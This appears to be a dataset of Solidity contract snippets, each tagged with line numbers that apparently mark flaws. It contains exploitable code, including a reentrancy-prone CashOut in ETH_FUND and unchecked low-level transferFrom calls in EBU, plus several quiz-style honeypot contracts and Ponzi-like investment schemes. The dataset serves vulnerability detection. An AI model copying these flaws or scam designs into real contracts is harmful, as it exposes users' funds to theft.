        function removeAddressFromQueue(uint256 index) onlyOwner public {
            require(index <= winnerQueueAmount.length);
            additionalFund +=  winnerQueueAmount[index];
            //this will shift one index up in both arrays, removing the address owner specified
            for (uint256 i = index; i<winnerQueueAmount.length-1; i++){
                winnerQueueAmount[i] = winnerQueueAmount[i+1];
                winnerQueueAddresses[i] = winnerQueueAddresses[i+1];
            }
            winnerQueueAmount.length--;
            winnerQueueAddresses.length--;
        }
        /**
         * This function removes the 35 queues. And restart the game again.
         * Those people who did not get the ETH will recieve tokens multiplied by 200
         * Which is: Ether amount * 200 tokens
         *
         *
         * Ether will remained in the contract will be used toward the next round
         */
        function restartTheQueue() onlyOwner public {
            //To become more gas cost effective, we want to process it differently when addresses are more or less than 35
            uint256 arrayLength = winnerQueueAmount.length;
            if(arrayLength < 35){
                //if addresses are less than 35 then we will just loop through it and send tokens","[63, 65]"
"            _amount = fund_;
            _tempValue = fund_;
            fund_ = 0;
            _winnerValue = _tempValue.mul(7).div(10);
            _mostInviteValue = _tempValue.mul(2).div(10);
            _laffValue = _tempValue.div(10);
            plyr_[winners_[0]].vault = plyr_[winners_[0]].vault.add(_winnerValue);
            plyr_[winners_[0]].totalVault = plyr_[winners_[0]].totalVault.add(_winnerValue);
            _winAddr = plyr_[winners_[0]].addr;
            if (winners_[1] == 0) {
                _mostInviteValue = 0;
            } else {
                _mostAddr = plyr_[winners_[1]].addr;
                plyr_[winners_[1]].vault = plyr_[winners_[1]].vault.add(_mostInviteValue);
                plyr_[winners_[1]].totalVault = plyr_[winners_[1]].totalVault.add(_mostInviteValue);
            }
            if (winners_[2] == 0) {
                _laffValue = 0;
            } else {
                plyr_[winners_[2]].vault = plyr_[winners_[2]].vault.add(_laffValue);
                plyr_[winners_[2]].totalVault = plyr_[winners_[2]].totalVault.add(_laffValue);
                _laffAddr = plyr_[winners_[2]].addr;
            }
        }
        emit Result(roundId_, endTime_, _amount, _winAddr, _winnerValue, _mostAddr, _mostInviteValue, _laffAddr, _laffValue);
        nextRound();
    }
    function nextRound()
        private
    {
        beginTime_ = now;
        endTime_ = now + gapTime_;
        delete joinPlys_;
        newMostInviteTimes_ = 0;
        newMostInviter_ = 0;
        roundId_++;
        beginTime_ = now;
        endTime_ = beginTime_ + gapTime_;
    }
    function withDraw()
        public
        isHuman()
        returns(bool)
    {
        uint256 _now = now;
        uint256 _pID = determinePID();
        if (_pID == 0) {
            return;
        }
        if (endTime_ > _now && fund_ > 0) {
            roundEnd();
        }
        if (plyr_[_pID].vault != 0) {
            uint256 vault = plyr_[_pID].vault;
            plyr_[_pID].vault = 0;
            msg.sender.transfer(vault);
        }
        return true;
    }
    function getRemainCount(address addr)
        public
        view
        returns(uint256)
    {
        uint256 pID = pIDxAddr_[addr];
        if (pID == 0) {
            return 1;
        }
        uint256 remainCount = 0;
        if (plyr_[pID].joinTime <= beginTime_) {
            remainCount = plyr_[pID].remainInviteCount < 4 ? plyr_[pID].remainInviteCount + 1 : 5;
        } else {
            if (plyr_[pID].remainInviteCount == 0) {
                remainCount = (plyr_[pID].drawCount == 0 ? 1 : 0);
            } else {
                if (plyr_[pID].drawCount >= 5) {
                    remainCount = 0;
                } else {
                    uint256 temp = (5 - plyr_[pID].drawCount);
                    remainCount = (plyr_[pID].remainInviteCount > temp ? temp :  plyr_[pID].remainInviteCount);
                }
            }
        }
        return remainCount;
    }
     /**
     * @dev gets existing or registers new pID.  use this when a player may be new
     * @return pID
     */
    function determinePID()
        private
        returns(uint256)
    {
        uint256 _pID = pIDxAddr_[msg.sender];
        if (_pID == 0) {
            pIdIter_ = pIdIter_ + 1;
            _pID = pIdIter_;
            pIDxAddr_[msg.sender] = _pID;
            plyr_[_pID].addr = msg.sender;
            inviteIter_ = inviteIter_.add(1);
            plyr_[_pID].inviteCode = inviteIter_;
            pInvitexID_[inviteIter_] = _pID;
        }
        return _pID;
    }
}","[50, 79]"
"interface OracleLike {
    function src() external view returns (address);
    function lift(address[] calldata) external;
    function drop(address[] calldata) external;
    function setBar(uint256) external;
    function kiss(address) external;
    function diss(address) external;
    function kiss(address[] calldata) external;
    function diss(address[] calldata) external;
}
abstract contract DssAction {
    address public immutable lib;
    bool    public immutable officeHours;
    // Changelog address applies to MCD deployments on
    //        mainnet, kovan, rinkeby, ropsten, and goerli
    address constant public LOG = 0xdA0Ab1e0017DEbCd72Be8599041a2aa3bA7e740F;
    constructor(address lib_, bool officeHours_) public {
        lib = lib_;
        officeHours = officeHours_;
    }
    // DssExec calls execute. We limit this function subject to officeHours modifier.
    function execute() external limited {
        actions();
    }
    // DssAction developer must override `actions()` and place all actions to be called inside.
    //   The DssExec function will call this subject to the officeHours limiter
    //   By keeping this function public we allow simulations of `execute()` on the actions outside of the cast time.
    function actions() public virtual;
    // Modifier required to
    modifier limited {
        if (officeHours) {
            uint day = (block.timestamp / 1 days + 3) % 7;
            require(day < 5, ""Can only be cast on a weekday"");
            uint hour = block.timestamp / 1 hours % 24;
            require(hour >= 14 && hour < 21, ""Outside office hours"");
        }
        _;
    }
    /****************************/
    /*** Core Address Helpers ***/
    /****************************/
    function vat()        internal view returns (address) { return getChangelogAddress(""MCD_VAT""); }
    function cat()        internal view returns (address) { return getChangelogAddress(""MCD_CAT""); }
    function jug()        internal view returns (address) { return getChangelogAddress(""MCD_JUG""); }
    function pot()        internal view returns (address) { return getChangelogAddress(""MCD_POT""); }
    function vow()        internal view returns (address) { return getChangelogAddress(""MCD_VOW""); }
    function end()        internal view returns (address) { return getChangelogAddress(""MCD_END""); }
    function reg()        internal view returns (address) { return getChangelogAddress(""ILK_REGISTRY""); }
    function spot()       internal view returns (address) { return getChangelogAddress(""MCD_SPOT""); }
    function flap()       internal view returns (address) { return getChangelogAddress(""MCD_FLAP""); }
    function flop()       internal view returns (address) { return getChangelogAddress(""MCD_FLOP""); }
    function osmMom()     internal view returns (address) { return getChangelogAddress(""OSM_MOM""); }
    function govGuard()   internal view returns (address) { return getChangelogAddress(""GOV_GUARD""); }
    function flipperMom() internal view returns (address) { return getChangelogAddress(""FLIPPER_MOM""); }
    function autoLine()   internal view returns (address) { return getChangelogAddress(""MCD_IAM_AUTO_LINE""); }
    function flip(bytes32 ilk) internal view returns (address) {
        (,,,, address _flip,,,) = RegistryLike(reg()).ilkData(ilk);
        return _flip;
    }
    function getChangelogAddress(bytes32 key) internal view returns (address) {
        return ChainlogLike(LOG).getAddress(key);
    }
    function libcall(bytes memory data) internal {
        (bool ok,) = lib.delegatecall(data);
        require(ok, ""DssAction/failed-lib-call"");
    }
    /****************************/
    /*** Changelog Management ***/
    /****************************/
    function setChangelogAddress(bytes32 key, address value) internal {
        libcall(abi.encodeWithSignature(""setChangelogAddress(address,bytes32,address)"", LOG, key, value));
    }
    function setChangelogVersion(string memory version) internal {
        libcall(abi.encodeWithSignature(""setChangelogVersion(address,string)"", LOG, version));
    }
    function setChangelogIPFS(string memory ipfs) internal {
        libcall(abi.encodeWithSignature(""setChangelogIPFS(address,string)"", LOG, ipfs));
    }
    function setChangelogSHA256(string memory SHA256) internal {
        libcall(abi.encodeWithSignature(""setChangelogSHA256(address,string)"", LOG, SHA256));
    }
    /**********************/
    /*** Authorizations ***/
    /**********************/
    function authorize(address base, address ward) internal virtual {
        libcall(abi.encodeWithSignature(""authorize(address,address)"", base, ward));
    }
    function deauthorize(address base, address ward) internal {
        libcall(abi.encodeWithSignature(""deauthorize(address,address)"", base, ward));
    }
    /**************************/
    /*** Accumulating Rates ***/
    /**************************/
    function accumulateDSR() internal {
        libcall(abi.encodeWithSignature(""accumulateDSR(address)"", pot()));
    }
    function accumulateCollateralStabilityFees(bytes32 ilk) internal {
        libcall(abi.encodeWithSignature(""accumulateCollateralStabilityFees(address,bytes32)"", jug(), ilk));
    }
    /*********************/
    /*** Price Updates ***/
    /*********************/
    function updateCollateralPrice(bytes32 ilk) internal {
        libcall(abi.encodeWithSignature(""updateCollateralPrice(address,bytes32)"", spot(), ilk));
    }
    /****************************/
    /*** System Configuration ***/
    /****************************/
    function setContract(address base, bytes32 what, address addr) internal {
        libcall(abi.encodeWithSignature(""setContract(address,bytes32,address)"", base, what, addr));
    }
    function setContract(address base, bytes32 ilk, bytes32 what, address addr) internal {
        libcall(abi.encodeWithSignature(""setContract(address,bytes32,bytes32,address)"", base, ilk, what, addr));
    }
    /******************************/
    /*** System Risk Parameters ***/
    /******************************/
    function setGlobalDebtCeiling(uint256 amount) internal {
        libcall(abi.encodeWithSignature(""setGlobalDebtCeiling(address,uint256)"", vat(), amount));
    }
    function increaseGlobalDebtCeiling(uint256 amount) internal {
        libcall(abi.encodeWithSignature(""increaseGlobalDebtCeiling(address,uint256)"", vat(), amount));
    }
    function decreaseGlobalDebtCeiling(uint256 amount) internal {
        libcall(abi.encodeWithSignature(""decreaseGlobalDebtCeiling(address,uint256)"", vat(), amount));
    }
    function setDSR(uint256 rate) internal {
        libcall(abi.encodeWithSignature(""setDSR(address,uint256)"", pot(), rate));",[64]
"pragma solidity ^0.4.18;
contract EBU{
    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],v[i]);
        }
        return true;
    }
}",[7]
"        // Update player location.
        playerToDungeonID[msg.sender] = _destinationDungeonId;
        // Emit the DungeonChallenged event.
        PlayerTransported(now, msg.sender, _originDungeonId, _destinationDungeonId);
    }
    /* ======== MODIFIERS ======== */
    /**
     * @dev Throws if dungeon status do not allow transportation, also check for dungeon existence.
     *  Also check if the capacity of the destination dungeon is reached.
     */
    modifier dungeonCanTransport(uint _destinationDungeonId) {
        require(_destinationDungeonId < dungeonTokenContract.totalSupply());
        uint status;
        uint capacity;
        (, status,, capacity,,,,,) = dungeonTokenContract.dungeons(_destinationDungeonId);
        require(status == 0 || status == 1);
        // Check if the capacity of the destination dungeon is reached.
        // Capacity 0 = Infinity
        require(capacity == 0 || dungeonIdToPlayerCount[_destinationDungeonId] < capacity);
        _;
    }
    /// @dev Throws if player did recruit first hero yet.
    modifier playerAllowedToTransport() {
        // Note that we check playerToFirstHeroRecruited instead of heroTokenContract.balanceOf
        // in order to prevent ""capacity attack"".
        require(playerToFirstHeroRecruited[msg.sender]);
        _;
    }
}
contract EDChallenge is EDTransportation {
    /* ======== PUBLIC/EXTERNAL FUNCTIONS ======== */
    /**
     * @dev The main external function to call when a player challenge a dungeon,
     *  it determines whether if the player successfully challenged the current floor.
     *  Will generate a DungeonChallenged event.
     */
    function challenge(uint _dungeonId, uint _heroId) whenNotPaused dungeonCanChallenge(_dungeonId) heroAllowedToChallenge(_heroId) external payable {
        // Set the last action block number, disallow player to perform another train or challenge in the same block.
        playerToLastActionBlockNumber[msg.sender] = block.number;
        // Set the previously temp stored upgraded hero genes.
        _setTempHeroPower();
        // Get the dungeon details from the token contract.
        uint difficulty;
        uint seedGenes;
        (,, difficulty,,,,, seedGenes,) = dungeonTokenContract.dungeons(_dungeonId);
        // Checks for payment, any exceeding funds will be transferred back to the player.
        uint requiredFee = difficulty * challengeFeeMultiplier;
        require(msg.value >= requiredFee);
        // ** STORAGE UPDATE **
        // Increment the accumulated rewards for the dungeon.
        dungeonTokenContract.addDungeonRewards(_dungeonId, requiredFee);
        // Calculate any excess funds and make it available to be withdrawed by the player.
        asyncSend(msg.sender, msg.value - requiredFee);
        // Split the challenge function into multiple parts because of stack too deep error.
        _challengePart2(_dungeonId, difficulty, _heroId);
    }
    /* ======== INTERNAL/PRIVATE FUNCTIONS ======== */
    /// @dev Compute the remaining time for which the hero can perform a challenge again.
    function _computeCooldownRemainingTime(uint _heroId) internal view returns (uint) {
        uint cooldownStartTime;
        uint cooldownIndex;
        (, cooldownStartTime, cooldownIndex,) = heroTokenContract.heroes(_heroId);
        // Cooldown period is FLOOR(challenge count / 2) ^ 2 minutes
        uint cooldownPeriod = (cooldownIndex / 2) ** 2 * 1 minutes;
        if (cooldownPeriod > 100 minutes) {
            cooldownPeriod = 100 minutes;
        }
        uint cooldownEndTime = cooldownStartTime + cooldownPeriod;
        if (cooldownEndTime <= now) {
            return 0;
        } else {
            return cooldownEndTime - now;
        }
    }
    /// @dev Split the challenge function into multiple parts because of stack too deep error.
    function _challengePart2(uint _dungeonId, uint _dungeonDifficulty, uint _heroId) private {
        uint floorNumber;
        uint rewards;
        uint floorGenes;
        (,,,, floorNumber,, rewards,, floorGenes) = dungeonTokenContract.dungeons(_dungeonId);
        // Get the hero gene.
        uint heroGenes;
        (,,, heroGenes) = heroTokenContract.heroes(_heroId);
        bool success = _getChallengeSuccess(heroGenes, _dungeonDifficulty, floorGenes);
        uint newFloorGenes;
        uint masterRewards;
        uint consolationRewards;
        uint successRewards;
        uint newRewards;
        // Whether a challenge is success or not is determined by a simple comparison between hero power and floor power.
        if (success) {
            newFloorGenes = _getNewFloorGene(_dungeonId);
            masterRewards = rewards * masterRewardsPercent / 100;
            consolationRewards = rewards * consolationRewardsPercent / 100;
            if (floorNumber < rushTimeFloorCount) { // rush time right after prepration period
                successRewards = rewards * rushTimeChallengeRewardsPercent / 100;
                // The dungeon rewards for new floor as total rewards - challenge rewards - devleoper fee.
                newRewards = rewards * (100 - rushTimeChallengeRewardsPercent - masterRewardsPercent - consolationRewardsPercent) / 100;
            } else {
                successRewards = rewards * challengeRewardsPercent / 100;
                newRewards = rewards * (100 - challengeRewardsPercent - masterRewardsPercent - consolationRewardsPercent) / 100;
            }
            // TRIPLE CONFIRM sanity check.
            require(successRewards + masterRewards + consolationRewards + newRewards <= rewards);
            // ** STORAGE UPDATE **
            // Add the consolation rewards to grandConsolationRewards.
            grandConsolationRewards += consolationRewards;
            // Add new floor with the new floor genes and new rewards.
            dungeonTokenContract.addDungeonNewFloor(_dungeonId, newRewards, newFloorGenes);
            // Mark the challenge rewards available to be withdrawed by the player.
            asyncSend(msg.sender, successRewards);
            // Mark the master rewards available to be withdrawed by the dungeon master.
            asyncSend(dungeonTokenContract.ownerOf(_dungeonId), masterRewards);
        }
        // ** STORAGE UPDATE **
        // Trigger the cooldown for the hero.
        heroTokenContract.triggerCooldown(_heroId);
        // Emit the DungeonChallenged event.
        DungeonChallenged(now, msg.sender, _dungeonId, _heroId, heroGenes, floorNumber, floorGenes, success, newFloorGenes, successRewards, masterRewards);
    }
    /// @dev Split the challenge function into multiple parts because of stack too deep error.
    function _getChallengeSuccess(uint _heroGenes, uint _dungeonDifficulty, uint _floorGenes) private pure returns (bool) {
        // Determine if the player challenge successfuly the dungeon or not.
        uint heroPower;
        (heroPower,,,,,) = getHeroPower(_heroGenes, _dungeonDifficulty);
        uint floorPower = getDungeonPower(_floorGenes);
        return heroPower > floorPower;
    }",[64]
"pragma solidity ^0.4.25;
contract ENIGMA
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0xb34056fc9cceae1a0d78a1fd248d57d4bd26d9d76afac86510a58758b2911638;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract ENIGMA
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetGame(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract ENIGMA_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"}
interface IERC20FeeProxy {
  event TransferWithReferenceAndFee(
    address tokenAddress,
    address to,
    uint256 amount,
    bytes indexed paymentReference,
    uint256 feeAmount,
    address feeAddress
  );
  function transferFromWithReferenceAndFee(
    address _tokenAddress,
    address _to,
    uint256 _amount,
    bytes calldata _paymentReference,
    uint256 _feeAmount,
    address _feeAddress
    ) external;
}
/**
 * @title ERC20ConversionProxy
 */
contract ERC20ConversionProxy {
  using SafeMath for uint256;
  address public paymentProxy;
  ChainlinkConversionPath public chainlinkConversionPath;
  constructor(address _paymentProxyAddress, address _chainlinkConversionPathAddress) public {
    paymentProxy = _paymentProxyAddress;
    chainlinkConversionPath = ChainlinkConversionPath(_chainlinkConversionPathAddress);
  }
  // Event to declare a transfer with a reference
  event TransferWithConversionAndReference(
    uint256 amount,
    address currency,
    bytes indexed paymentReference,
    uint256 feeAmount,
    uint256 maxRateTimespan
  );
  /**
   * @notice Performs an ERC20 token transfer with a reference computing the amount based on a fiat amount
   * @param _to Transfer recipient
   * @param _requestAmount request amount
   * @param _path conversion path
   * @param _paymentReference Reference of the payment related
   * @param _feeAmount The amount of the payment fee
   * @param _feeAddress The fee recipient
   * @param _maxToSpend amount max that we can spend on the behalf of the user
   * @param _maxRateTimespan max time span with the oldestrate, ignored if zero
   */
  function transferFromWithReferenceAndFee(
    address _to,
    uint256 _requestAmount,
    address[] calldata _path,
    bytes calldata _paymentReference,
    uint256 _feeAmount,
    address _feeAddress,
    uint256 _maxToSpend,
    uint256 _maxRateTimespan
  ) external
  {
    (uint256 amountToPay, uint256 amountToPayInFees) = getConversions(_path, _requestAmount, _feeAmount, _maxRateTimespan);
    require(amountToPay.add(amountToPayInFees) <= _maxToSpend, ""Amount to pay is over the user limit"");
    // Pay the request and fees
    (bool status, ) = paymentProxy.delegatecall(
      abi.encodeWithSignature(
        ""transferFromWithReferenceAndFee(address,address,uint256,bytes,uint256,address)"",
        // payment currency
        _path[_path.length - 1],
        _to,
        amountToPay,
        _paymentReference,
        amountToPayInFees,
        _feeAddress
      )
    );
    require(status, ""transferFromWithReferenceAndFee failed"");
    // Event to declare a transfer with a reference
    emit TransferWithConversionAndReference(
      _requestAmount,
      // request currency
      _path[0],
      _paymentReference,
      _feeAmount,
      _maxRateTimespan
    );
  }
  function getConversions(
    address[] memory _path,
    uint256 _requestAmount,
    uint256 _feeAmount,
    uint256 _maxRateTimespan
  ) internal
    view
    returns (uint256 amountToPay, uint256 amountToPayInFees)
  {
    (uint256 rate, uint256 oldestTimestampRate, uint256 decimals) = chainlinkConversionPath.getRate(_path);
    // Check rate timespan
    require(_maxRateTimespan == 0 || block.timestamp.sub(oldestTimestampRate) <= _maxRateTimespan, ""aggregator rate is outdated"");
    // Get the amount to pay in the crypto currency chosen
    amountToPay = _requestAmount.mul(rate).div(decimals);
    amountToPayInFees = _feeAmount.mul(rate).div(decimals);
  }
}",[64]
"pragma solidity ^0.4.20;
contract ETH_FOR_ANSWER
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.19;
contract ETH_FUND
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    uint lastBlock;
    function ETH_FUND(address _log)
    public 
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
            lastBlock = block.number;
        }
    }
    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=balances[msg.sender]&&block.number>lastBlock)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[30, 32]"
"pragma solidity ^0.4.20;
contract ETH_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract ETH_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract ETH_QUEST
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>=1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function setGame(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.19;
contract ETH_QUIZ
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>0.5 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract ETH_QUIZ
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity 0.4.24;
            // www.eagleturst.money
          //------ busniness plan ------
    // level 1 -0.05 +0.005  maintinance fee
    // level 2 -0.10 +0.010  maintinance fee
    // level 3 -0.15 +0.015  maintinance fee
    // level 4 -   0.30 +0.03 maintinance fee
    // level 5 -   1 +0.10   maintinance fee
    // level 6 -   2  +0.20  maintinance fee  
    // level 7 -   4 +0.40   maintinance fee
    // level 8 -   8 +0.80   maintinance fee
    // level 9 -   16 +1.60   maintinance fee
    // level 10 -   32 +3.2    maintinance fee
    // level 11 -   64+6.4    maintinance fee
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract EagleTurstMoney {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[65]
"    }
	function register_(address addr) private{
        round_[rId_].nowUserId = round_[rId_].nowUserId.add(1);
        address _addr = addr;
        pIDxAddr_[rId_][_addr] = round_[rId_].nowUserId;
        player_[rId_][round_[rId_].nowUserId].addr = _addr;
        player_[rId_][round_[rId_].nowUserId].planCount = 0;
	}
    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest();
        }
    }
    function invest() private {
	    uint256 _planId = bytesToUint(msg.data);
	    if (_planId<1 || _planId > ruleSum_) {
	        _planId = 1;
	    }
		//get uid
		uint256 uid = pIDxAddr_[rId_][msg.sender];
		//first
		if (uid == 0) {
		    register_(msg.sender);
			uid = round_[rId_].nowUserId;
		}
        // record block number and invested amount (msg.value) of this transaction
        uint256 planCount = player_[rId_][uid].planCount;
        player_[rId_][uid].plans[planCount].planId = _planId;
        player_[rId_][uid].plans[planCount].startTime = now;
        player_[rId_][uid].plans[planCount].startBlock = block.number;
        player_[rId_][uid].plans[planCount].atBlock = block.number;
        player_[rId_][uid].plans[planCount].invested = msg.value;
        player_[rId_][uid].plans[planCount].payEth = 0;
        player_[rId_][uid].plans[planCount].isClose = false;
        player_[rId_][uid].planCount = player_[rId_][uid].planCount.add(1);
        round_[rId_].ethSum = round_[rId_].ethSum.add(msg.value);
        if (msg.value > 1000000000) {
            uint256 promoFee = (msg.value.mul(5)).div(100);
            promoAddr_.transfer(promoFee);
        }
    }
	function withdraw() private {
	    require(msg.value == 0, ""withdraw fee is 0 ether, please set the exact amount"");
	    uint256 uid = pIDxAddr_[rId_][msg.sender];
	    require(uid != 0, ""no invest"");
        for(uint i = 0; i < player_[rId_][uid].planCount; i++) {
	        if (player_[rId_][uid].plans[i].isClose) {
	            continue;
	        }
            ESDatasets.Plan plan = plan_[player_[rId_][uid].plans[i].planId];
            uint256 blockNumber = block.number;
            bool bClose = false;
            if (plan.dayRange > 0) {
